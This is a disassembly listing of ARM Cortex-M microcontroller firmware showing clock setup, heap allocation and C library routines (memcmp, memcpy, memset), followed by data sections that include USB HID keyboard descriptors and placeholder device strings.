      ndiv = ((SCU_PLL->PLLCON1 & SCU_PLL_PLLCON1_NDIV_Msk) >> SCU_PLL_PLLCON1_NDIV_Pos) + 1;
 8006558:	4b20      	ldr	r3, [pc, #128]	; (80065dc <SystemCoreClockUpdate+0xc8>)
 800655a:	689b      	ldr	r3, [r3, #8]
 800655c:	0a1b      	lsrs	r3, r3, #8
 800655e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8006562:	3301      	adds	r3, #1
 8006564:	603b      	str	r3, [r7, #0]
      kdiv = ((SCU_PLL->PLLCON1 & SCU_PLL_PLLCON1_K2DIV_Msk) >> SCU_PLL_PLLCON1_K2DIV_Pos) + 1;
 8006566:	4b1d      	ldr	r3, [pc, #116]	; (80065dc <SystemCoreClockUpdate+0xc8>)
 8006568:	689b      	ldr	r3, [r3, #8]
 800656a:	0c1b      	lsrs	r3, r3, #16
 800656c:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8006570:	3301      	adds	r3, #1
 8006572:	60bb      	str	r3, [r7, #8]

      temp = (temp / (pdiv * kdiv)) * ndiv;
 8006574:	687b      	ldr	r3, [r7, #4]
 8006576:	68ba      	ldr	r2, [r7, #8]
 8006578:	fb02 f303 	mul.w	r3, r2, r3
 800657c:	68fa      	ldr	r2, [r7, #12]
 800657e:	fbb2 f2f3 	udiv	r2, r2, r3
 8006582:	683b      	ldr	r3, [r7, #0]
 8006584:	fb02 f303 	mul.w	r3, r2, r3
 8006588:	60fb      	str	r3, [r7, #12]
 800658a:	e00d      	b.n	80065a8 <SystemCoreClockUpdate+0x94>
    }
    else
    {
      /* PLL prescalar mode */
      /* read back divider settings */
      kdiv  = ((SCU_PLL->PLLCON1 & SCU_PLL_PLLCON1_K1DIV_Msk) >> SCU_PLL_PLLCON1_K1DIV_Pos) + 1;
 800658c:	4b13      	ldr	r3, [pc, #76]	; (80065dc <SystemCoreClockUpdate+0xc8>)
 800658e:	689b      	ldr	r3, [r3, #8]
 8006590:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8006594:	3301      	adds	r3, #1
 8006596:	60bb      	str	r3, [r7, #8]
      
      temp = (temp / kdiv);
 8006598:	68fa      	ldr	r2, [r7, #12]
 800659a:	68bb      	ldr	r3, [r7, #8]
 800659c:	fbb2 f3f3 	udiv	r3, r2, r3
 80065a0:	60fb      	str	r3, [r7, #12]
 80065a2:	e001      	b.n	80065a8 <SystemCoreClockUpdate+0x94>
    }
  }
  else
  {
    /* fOFI is clock source for fSYS */    
    temp = OFI_FREQUENCY;
 80065a4:	4b0e      	ldr	r3, [pc, #56]	; (80065e0 <SystemCoreClockUpdate+0xcc>)
 80065a6:	60fb      	str	r3, [r7, #12]
  }

  temp = temp / ((SCU_CLK->SYSCLKCR & SCU_CLK_SYSCLKCR_SYSDIV_Msk) + 1);
 80065a8:	4b0b      	ldr	r3, [pc, #44]	; (80065d8 <SystemCoreClockUpdate+0xc4>)
 80065aa:	68db      	ldr	r3, [r3, #12]
 80065ac:	b2db      	uxtb	r3, r3
 80065ae:	3301      	adds	r3, #1
 80065b0:	68fa      	ldr	r2, [r7, #12]
 80065b2:	fbb2 f3f3 	udiv	r3, r2, r3
 80065b6:	60fb      	str	r3, [r7, #12]
  temp = temp / ((SCU_CLK->CPUCLKCR & SCU_CLK_CPUCLKCR_CPUDIV_Msk) + 1);
 80065b8:	4b07      	ldr	r3, [pc, #28]	; (80065d8 <SystemCoreClockUpdate+0xc4>)
 80065ba:	691b      	ldr	r3, [r3, #16]
 80065bc:	f003 0301 	and.w	r3, r3, #1
 80065c0:	3301      	adds	r3, #1
 80065c2:	68fa      	ldr	r2, [r7, #12]
 80065c4:	fbb2 f3f3 	udiv	r3, r2, r3
 80065c8:	60fb      	str	r3, [r7, #12]

  SystemCoreClock = temp;
 80065ca:	4a06      	ldr	r2, [pc, #24]	; (80065e4 <SystemCoreClockUpdate+0xd0>)
 80065cc:	68fb      	ldr	r3, [r7, #12]
 80065ce:	6013      	str	r3, [r2, #0]
}
 80065d0:	bf00      	nop
 80065d2:	3710      	adds	r7, #16
 80065d4:	46bd      	mov	sp, r7
 80065d6:	bd80      	pop	{r7, pc}
 80065d8:	50004600 	.word	0x50004600
 80065dc:	50004710 	.word	0x50004710
 80065e0:	016e3600 	.word	0x016e3600
 80065e4:	2000ffc0 	.word	0x2000ffc0

080065e8 <OSCHP_GetFrequency>:

__WEAK uint32_t OSCHP_GetFrequency(void)
{
 80065e8:	b480      	push	{r7}
 80065ea:	af00      	add	r7, sp, #0
  return OSCHP_FREQUENCY;
 80065ec:	4b02      	ldr	r3, [pc, #8]	; (80065f8 <OSCHP_GetFrequency+0x10>)
}
 80065ee:	4618      	mov	r0, r3
 80065f0:	46bd      	mov	sp, r7
 80065f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80065f6:	4770      	bx	lr
 80065f8:	00b71b00 	.word	0x00b71b00

080065fc <_sbrk>:

// defined in linker script
extern caddr_t Heap_Bank1_Start;
extern caddr_t Heap_Bank1_End;
caddr_t _sbrk(int nbytes)
{
 80065fc:	b580      	push	{r7, lr}
 80065fe:	b084      	sub	sp, #16
 8006600:	af00      	add	r7, sp, #0
 8006602:	6078      	str	r0, [r7, #4]
  static caddr_t heap_ptr = NULL;
  caddr_t base;

  if (heap_ptr == NULL) {
 8006604:	4b14      	ldr	r3, [pc, #80]	; (8006658 <_sbrk+0x5c>)
 8006606:	681b      	ldr	r3, [r3, #0]
 8006608:	2b00      	cmp	r3, #0
 800660a:	d102      	bne.n	8006612 <_sbrk+0x16>
    heap_ptr = (caddr_t)&Heap_Bank1_Start;
 800660c:	4b12      	ldr	r3, [pc, #72]	; (8006658 <_sbrk+0x5c>)
 800660e:	4a13      	ldr	r2, [pc, #76]	; (800665c <_sbrk+0x60>)
 8006610:	601a      	str	r2, [r3, #0]
  }

  base = heap_ptr;
 8006612:	4b11      	ldr	r3, [pc, #68]	; (8006658 <_sbrk+0x5c>)
 8006614:	681b      	ldr	r3, [r3, #0]
 8006616:	60fb      	str	r3, [r7, #12]

  /* heap word alignment */
  nbytes = (nbytes + 3) & ~0x3U;
 8006618:	687b      	ldr	r3, [r7, #4]
 800661a:	3303      	adds	r3, #3
 800661c:	f023 0303 	bic.w	r3, r3, #3
 8006620:	607b      	str	r3, [r7, #4]
  if ((caddr_t)&Heap_Bank1_End > (heap_ptr + nbytes))
 8006622:	4b0d      	ldr	r3, [pc, #52]	; (8006658 <_sbrk+0x5c>)
 8006624:	681a      	ldr	r2, [r3, #0]
 8006626:	687b      	ldr	r3, [r7, #4]
 8006628:	4413      	add	r3, r2
 800662a:	4a0d      	ldr	r2, [pc, #52]	; (8006660 <_sbrk+0x64>)
 800662c:	4293      	cmp	r3, r2
 800662e:	d207      	bcs.n	8006640 <_sbrk+0x44>
  {
    heap_ptr += nbytes;
 8006630:	4b09      	ldr	r3, [pc, #36]	; (8006658 <_sbrk+0x5c>)
 8006632:	681a      	ldr	r2, [r3, #0]
 8006634:	687b      	ldr	r3, [r7, #4]
 8006636:	4413      	add	r3, r2
 8006638:	4a07      	ldr	r2, [pc, #28]	; (8006658 <_sbrk+0x5c>)
 800663a:	6013      	str	r3, [r2, #0]
    return (base);
 800663c:	68fb      	ldr	r3, [r7, #12]
 800663e:	e006      	b.n	800664e <_sbrk+0x52>
  }
  else
  {
    /* Heap overflow */
    errno = ENOMEM;
 8006640:	f000 f818 	bl	8006674 <__errno>
 8006644:	4603      	mov	r3, r0
 8006646:	220c      	movs	r2, #12
 8006648:	601a      	str	r2, [r3, #0]
    return ((caddr_t)-1);
 800664a:	f04f 33ff 	mov.w	r3, #4294967295	; 0xffffffff
  }
}
 800664e:	4618      	mov	r0, r3
 8006650:	3710      	adds	r7, #16
 8006652:	46bd      	mov	sp, r7
 8006654:	bd80      	pop	{r7, pc}
 8006656:	bf00      	nop
 8006658:	20000ca4 	.word	0x20000ca4
 800665c:	20000ca8 	.word	0x20000ca8
 8006660:	2000ffc0 	.word	0x2000ffc0

08006664 <_init>:

/* Init */
void _init(void)
{}
 8006664:	b480      	push	{r7}
 8006666:	af00      	add	r7, sp, #0
 8006668:	bf00      	nop
 800666a:	46bd      	mov	sp, r7
 800666c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006670:	4770      	bx	lr
	...

08006674 <__errno>:
 8006674:	4b01      	ldr	r3, [pc, #4]	; (800667c <__errno+0x8>)
 8006676:	6818      	ldr	r0, [r3, #0]
 8006678:	4770      	bx	lr
 800667a:	bf00      	nop
 800667c:	20000214 	.word	0x20000214

08006680 <__libc_init_array>:
 8006680:	b570      	push	{r4, r5, r6, lr}
 8006682:	4e0d      	ldr	r6, [pc, #52]	; (80066b8 <__libc_init_array+0x38>)
 8006684:	4d0d      	ldr	r5, [pc, #52]	; (80066bc <__libc_init_array+0x3c>)
 8006686:	1b76      	subs	r6, r6, r5
 8006688:	10b6      	asrs	r6, r6, #2
 800668a:	d006      	beq.n	800669a <__libc_init_array+0x1a>
 800668c:	2400      	movs	r4, #0
 800668e:	f855 3b04 	ldr.w	r3, [r5], #4
 8006692:	3401      	adds	r4, #1
 8006694:	4798      	blx	r3
 8006696:	42a6      	cmp	r6, r4
 8006698:	d1f9      	bne.n	800668e <__libc_init_array+0xe>
 800669a:	4e09      	ldr	r6, [pc, #36]	; (80066c0 <__libc_init_array+0x40>)
 800669c:	4d09      	ldr	r5, [pc, #36]	; (80066c4 <__libc_init_array+0x44>)
 800669e:	1b76      	subs	r6, r6, r5
 80066a0:	f7ff ffe0 	bl	8006664 <_init>
 80066a4:	10b6      	asrs	r6, r6, #2
 80066a6:	d006      	beq.n	80066b6 <__libc_init_array+0x36>
 80066a8:	2400      	movs	r4, #0
 80066aa:	f855 3b04 	ldr.w	r3, [r5], #4
 80066ae:	3401      	adds	r4, #1
 80066b0:	4798      	blx	r3
 80066b2:	42a6      	cmp	r6, r4
 80066b4:	d1f9      	bne.n	80066aa <__libc_init_array+0x2a>
 80066b6:	bd70      	pop	{r4, r5, r6, pc}
 80066b8:	20000640 	.word	0x20000640
 80066bc:	20000640 	.word	0x20000640
 80066c0:	20000640 	.word	0x20000640
 80066c4:	20000640 	.word	0x20000640

080066c8 <memcmp>:
 80066c8:	2a03      	cmp	r2, #3
 80066ca:	b510      	push	{r4, lr}
 80066cc:	d917      	bls.n	80066fe <memcmp+0x36>
 80066ce:	ea40 0c01 	orr.w	ip, r0, r1
 80066d2:	f01c 0f03 	tst.w	ip, #3
 80066d6:	4604      	mov	r4, r0
 80066d8:	460b      	mov	r3, r1
 80066da:	d123      	bne.n	8006724 <memcmp+0x5c>
 80066dc:	4619      	mov	r1, r3
 80066de:	4620      	mov	r0, r4
 80066e0:	f8d1 e000 	ldr.w	lr, [r1]
 80066e4:	f8d0 c000 	ldr.w	ip, [r0]
 80066e8:	45f4      	cmp	ip, lr
 80066ea:	f104 0404 	add.w	r4, r4, #4
 80066ee:	f103 0304 	add.w	r3, r3, #4
 80066f2:	d117      	bne.n	8006724 <memcmp+0x5c>
 80066f4:	3a04      	subs	r2, #4
 80066f6:	2a03      	cmp	r2, #3
 80066f8:	4620      	mov	r0, r4
 80066fa:	4619      	mov	r1, r3
 80066fc:	d8ee      	bhi.n	80066dc <memcmp+0x14>
 80066fe:	1e54      	subs	r4, r2, #1
 8006700:	b1a2      	cbz	r2, 800672c <memcmp+0x64>
 8006702:	f100 3cff 	add.w	ip, r0, #4294967295	; 0xffffffff
 8006706:	3901      	subs	r1, #1
 8006708:	e001      	b.n	800670e <memcmp+0x46>
 800670a:	18c3      	adds	r3, r0, r3
 800670c:	d00c      	beq.n	8006728 <memcmp+0x60>
 800670e:	f81c ef01 	ldrb.w	lr, [ip, #1]!
 8006712:	f811 2f01 	ldrb.w	r2, [r1, #1]!
 8006716:	4596      	cmp	lr, r2
 8006718:	eba4 030c 	sub.w	r3, r4, ip
 800671c:	d0f5      	beq.n	800670a <memcmp+0x42>
 800671e:	ebae 0002 	sub.w	r0, lr, r2
 8006722:	bd10      	pop	{r4, pc}
 8006724:	1e54      	subs	r4, r2, #1
 8006726:	e7ec      	b.n	8006702 <memcmp+0x3a>
 8006728:	4618      	mov	r0, r3
 800672a:	bd10      	pop	{r4, pc}
 800672c:	4610      	mov	r0, r2
 800672e:	bd10      	pop	{r4, pc}

08006730 <memcpy>:
 8006730:	4684      	mov	ip, r0
 8006732:	ea41 0300 	orr.w	r3, r1, r0
 8006736:	f013 0303 	ands.w	r3, r3, #3
 800673a:	d16d      	bne.n	8006818 <memcpy+0xe8>
 800673c:	3a40      	subs	r2, #64	; 0x40
 800673e:	d341      	bcc.n	80067c4 <memcpy+0x94>
 8006740:	f851 3b04 	ldr.w	r3, [r1], #4
 8006744:	f840 3b04 	str.w	r3, [r0], #4
 8006748:	f851 3b04 	ldr.w	r3, [r1], #4
 800674c:	f840 3b04 	str.w	r3, [r0], #4
 8006750:	f851 3b04 	ldr.w	r3, [r1], #4
 8006754:	f840 3b04 	str.w	r3, [r0], #4
 8006758:	f851 3b04 	ldr.w	r3, [r1], #4
 800675c:	f840 3b04 	str.w	r3, [r0], #4
 8006760:	f851 3b04 	ldr.w	r3, [r1], #4
 8006764:	f840 3b04 	str.w	r3, [r0], #4
 8006768:	f851 3b04 	ldr.w	r3, [r1], #4
 800676c:	f840 3b04 	str.w	r3, [r0], #4
 8006770:	f851 3b04 	ldr.w	r3, [r1], #4
 8006774:	f840 3b04 	str.w	r3, [r0], #4
 8006778:	f851 3b04 	ldr.w	r3, [r1], #4
 800677c:	f840 3b04 	str.w	r3, [r0], #4
 8006780:	f851 3b04 	ldr.w	r3, [r1], #4
 8006784:	f840 3b04 	str.w	r3, [r0], #4
 8006788:	f851 3b04 	ldr.w	r3, [r1], #4
 800678c:	f840 3b04 	str.w	r3, [r0], #4
 8006790:	f851 3b04 	ldr.w	r3, [r1], #4
 8006794:	f840 3b04 	str.w	r3, [r0], #4
 8006798:	f851 3b04 	ldr.w	r3, [r1], #4
 800679c:	f840 3b04 	str.w	r3, [r0], #4
 80067a0:	f851 3b04 	ldr.w	r3, [r1], #4
 80067a4:	f840 3b04 	str.w	r3, [r0], #4
 80067a8:	f851 3b04 	ldr.w	r3, [r1], #4
 80067ac:	f840 3b04 	str.w	r3, [r0], #4
 80067b0:	f851 3b04 	ldr.w	r3, [r1], #4
 80067b4:	f840 3b04 	str.w	r3, [r0], #4
 80067b8:	f851 3b04 	ldr.w	r3, [r1], #4
 80067bc:	f840 3b04 	str.w	r3, [r0], #4
 80067c0:	3a40      	subs	r2, #64	; 0x40
 80067c2:	d2bd      	bcs.n	8006740 <memcpy+0x10>
 80067c4:	3230      	adds	r2, #48	; 0x30
 80067c6:	d311      	bcc.n	80067ec <memcpy+0xbc>
 80067c8:	f851 3b04 	ldr.w	r3, [r1], #4
 80067cc:	f840 3b04 	str.w	r3, [r0], #4
 80067d0:	f851 3b04 	ldr.w	r3, [r1], #4
 80067d4:	f840 3b04 	str.w	r3, [r0], #4
 80067d8:	f851 3b04 	ldr.w	r3, [r1], #4
 80067dc:	f840 3b04 	str.w	r3, [r0], #4
 80067e0:	f851 3b04 	ldr.w	r3, [r1], #4
 80067e4:	f840 3b04 	str.w	r3, [r0], #4
 80067e8:	3a10      	subs	r2, #16
 80067ea:	d2ed      	bcs.n	80067c8 <memcpy+0x98>
 80067ec:	320c      	adds	r2, #12
 80067ee:	d305      	bcc.n	80067fc <memcpy+0xcc>
 80067f0:	f851 3b04 	ldr.w	r3, [r1], #4
 80067f4:	f840 3b04 	str.w	r3, [r0], #4
 80067f8:	3a04      	subs	r2, #4
 80067fa:	d2f9      	bcs.n	80067f0 <memcpy+0xc0>
 80067fc:	3204      	adds	r2, #4
 80067fe:	d008      	beq.n	8006812 <memcpy+0xe2>
 8006800:	07d2      	lsls	r2, r2, #31
 8006802:	bf1c      	itt	ne
 8006804:	f811 3b01 	ldrbne.w	r3, [r1], #1
 8006808:	f800 3b01 	strbne.w	r3, [r0], #1
 800680c:	d301      	bcc.n	8006812 <memcpy+0xe2>
 800680e:	880b      	ldrh	r3, [r1, #0]
 8006810:	8003      	strh	r3, [r0, #0]
 8006812:	4660      	mov	r0, ip
 8006814:	4770      	bx	lr
 8006816:	bf00      	nop
 8006818:	2a08      	cmp	r2, #8
 800681a:	d313      	bcc.n	8006844 <memcpy+0x114>
 800681c:	078b      	lsls	r3, r1, #30
 800681e:	d08d      	beq.n	800673c <memcpy+0xc>
 8006820:	f010 0303 	ands.w	r3, r0, #3
 8006824:	d08a      	beq.n	800673c <memcpy+0xc>
 8006826:	f1c3 0304 	rsb	r3, r3, #4
 800682a:	1ad2      	subs	r2, r2, r3
 800682c:	07db      	lsls	r3, r3, #31
 800682e:	bf1c      	itt	ne
 8006830:	f811 3b01 	ldrbne.w	r3, [r1], #1
 8006834:	f800 3b01 	strbne.w	r3, [r0], #1
 8006838:	d380      	bcc.n	800673c <memcpy+0xc>
 800683a:	f831 3b02 	ldrh.w	r3, [r1], #2
 800683e:	f820 3b02 	strh.w	r3, [r0], #2
 8006842:	e77b      	b.n	800673c <memcpy+0xc>
 8006844:	3a04      	subs	r2, #4
 8006846:	d3d9      	bcc.n	80067fc <memcpy+0xcc>
 8006848:	3a01      	subs	r2, #1
 800684a:	f811 3b01 	ldrb.w	r3, [r1], #1
 800684e:	f800 3b01 	strb.w	r3, [r0], #1
 8006852:	d2f9      	bcs.n	8006848 <memcpy+0x118>
 8006854:	780b      	ldrb	r3, [r1, #0]
 8006856:	7003      	strb	r3, [r0, #0]
 8006858:	784b      	ldrb	r3, [r1, #1]
 800685a:	7043      	strb	r3, [r0, #1]
 800685c:	788b      	ldrb	r3, [r1, #2]
 800685e:	7083      	strb	r3, [r0, #2]
 8006860:	4660      	mov	r0, ip
 8006862:	4770      	bx	lr

08006864 <memset>:
 8006864:	0783      	lsls	r3, r0, #30
 8006866:	b530      	push	{r4, r5, lr}
 8006868:	d048      	beq.n	80068fc <memset+0x98>
 800686a:	1e54      	subs	r4, r2, #1
 800686c:	2a00      	cmp	r2, #0
 800686e:	d03f      	beq.n	80068f0 <memset+0x8c>
 8006870:	b2ca      	uxtb	r2, r1
 8006872:	4603      	mov	r3, r0
 8006874:	e001      	b.n	800687a <memset+0x16>
 8006876:	3c01      	subs	r4, #1
 8006878:	d33a      	bcc.n	80068f0 <memset+0x8c>
 800687a:	f803 2b01 	strb.w	r2, [r3], #1
 800687e:	079d      	lsls	r5, r3, #30
 8006880:	d1f9      	bne.n	8006876 <memset+0x12>
 8006882:	2c03      	cmp	r4, #3
 8006884:	d92d      	bls.n	80068e2 <memset+0x7e>
 8006886:	b2cd      	uxtb	r5, r1
 8006888:	ea45 2505 	orr.w	r5, r5, r5, lsl #8
 800688c:	2c0f      	cmp	r4, #15
 800688e:	ea45 4505 	orr.w	r5, r5, r5, lsl #16
 8006892:	d936      	bls.n	8006902 <memset+0x9e>
 8006894:	f1a4 0210 	sub.w	r2, r4, #16
 8006898:	f022 0c0f 	bic.w	ip, r2, #15
 800689c:	f103 0e20 	add.w	lr, r3, #32
 80068a0:	44e6      	add	lr, ip
 80068a2:	ea4f 1c12 	mov.w	ip, r2, lsr #4
 80068a6:	f103 0210 	add.w	r2, r3, #16
 80068aa:	e942 5504 	strd	r5, r5, [r2, #-16]
 80068ae:	e942 5502 	strd	r5, r5, [r2, #-8]
 80068b2:	3210      	adds	r2, #16
 80068b4:	4572      	cmp	r2, lr
 80068b6:	d1f8      	bne.n	80068aa <memset+0x46>
 80068b8:	f10c 0201 	add.w	r2, ip, #1
 80068bc:	f014 0f0c 	tst.w	r4, #12
 80068c0:	eb03 1202 	add.w	r2, r3, r2, lsl #4
 80068c4:	f004 0c0f 	and.w	ip, r4, #15
 80068c8:	d013      	beq.n	80068f2 <memset+0x8e>
 80068ca:	f1ac 0304 	sub.w	r3, ip, #4
 80068ce:	f023 0303 	bic.w	r3, r3, #3
 80068d2:	3304      	adds	r3, #4
 80068d4:	4413      	add	r3, r2
 80068d6:	f842 5b04 	str.w	r5, [r2], #4
 80068da:	4293      	cmp	r3, r2
 80068dc:	d1fb      	bne.n	80068d6 <memset+0x72>
 80068de:	f00c 0403 	and.w	r4, ip, #3
 80068e2:	b12c      	cbz	r4, 80068f0 <memset+0x8c>
 80068e4:	b2ca      	uxtb	r2, r1
 80068e6:	441c      	add	r4, r3
 80068e8:	f803 2b01 	strb.w	r2, [r3], #1
 80068ec:	429c      	cmp	r4, r3
 80068ee:	d1fb      	bne.n	80068e8 <memset+0x84>
 80068f0:	bd30      	pop	{r4, r5, pc}
 80068f2:	4664      	mov	r4, ip
 80068f4:	4613      	mov	r3, r2
 80068f6:	2c00      	cmp	r4, #0
 80068f8:	d1f4      	bne.n	80068e4 <memset+0x80>
 80068fa:	e7f9      	b.n	80068f0 <memset+0x8c>
 80068fc:	4603      	mov	r3, r0
 80068fe:	4614      	mov	r4, r2
 8006900:	e7bf      	b.n	8006882 <memset+0x1e>
 8006902:	461a      	mov	r2, r3
 8006904:	46a4      	mov	ip, r4
 8006906:	e7e0      	b.n	80068ca <memset+0x66>

08006908 <clock_config>:
 8006908:	0250 0104 0000 0001 0000 0000 0000 0001     P...............
 8006918:	0101 0101                                   ....

0800691c <KeyboardReport>:
 800691c:	0105 0609 01a1 0705 e019 e729 0015 0125     ..........)...%.
 800692c:	0175 0895 0281 0195 0875 0181 0805 0119     u.......u.......
 800693c:	0529 0595 0175 0291 0195 0375 0191 0015     )...u.....u.....
 800694c:	ff25 0705 0019 ff29 0695 0875 0081 00c0     %.....)...u.....

0800695c <DeviceDescriptor>:
 800695c:	0112 0110 0000 4000 03eb 2042 0001 0201     .......@..B ....
 800696c:	0100 0000                                   ....

08006970 <ConfigurationDescriptor>:
 8006970:	0209 0022 0101 c000 0932 0004 0100 0103     ..".....2.......
 8006980:	0001 2109 0111 0100 3f22 0700 8105 0803     ...!...."?......
 8006990:	0100 0000                                   ....

08006994 <LanguageString>:
 8006994:	0304 0409 0000 0000                         ........

0800699c <ManufacturerString>:
 800699c:	0350 004d 0000 0061 0000 006e 0000 0075     P.M...a...n...u.
 80069ac:	0000 0066 0000 0061 0000 0063 0000 0074     ..f...a...c...t.
 80069bc:	0000 0075 0000 0072 0000 0065 0000 0072     ..u...r...e...r.
 80069cc:	0000 0020 0000 0053 0000 0074 0000 0072     .. ...S...t...r.
 80069dc:	0000 0069 0000 006e 0000 0067 0000 0000     ..i...n...g.....
 80069ec:	0000 0000                                   ....

080069f0 <ProductString>:
 80069f0:	0348 0044 0000 0065 0000 0073 0000 0063     H.D...e...s...c.
 8006a00:	0000 0072 0000 0069 0000 0070 0000 0074     ..r...i...p...t.
 8006a10:	0000 006f 0000 0072 0000 0020 0000 0053     ..o...r... ...S.
 8006a20:	0000 0074 0000 0072 0000 0069 0000 006e     ..t...r...i...n.
 8006a30:	0000 0067 0000 0000 0000 0000               ..g.........

08006a3c <Driver_USBD0>:
 8006a3c:	53fd 0800 5465 0800 56a1 0800 56dd 0800     .S..eT...V...V..
 8006a4c:	5711 0800 5745 0800 594d 0800 5b6d 0800     .W..EW..MY..m[..
 8006a5c:	5e65 0800 5999 0800 57a9 0800 5831 0800     e^...Y...W..1X..
 8006a6c:	58a9 0800 5ae5 0800 5fd5 0800 6001 0800     .X...Z..._...`..

08006a7c <_global_impure_ptr>:
 8006a7c:	0218 2000                                   ... 
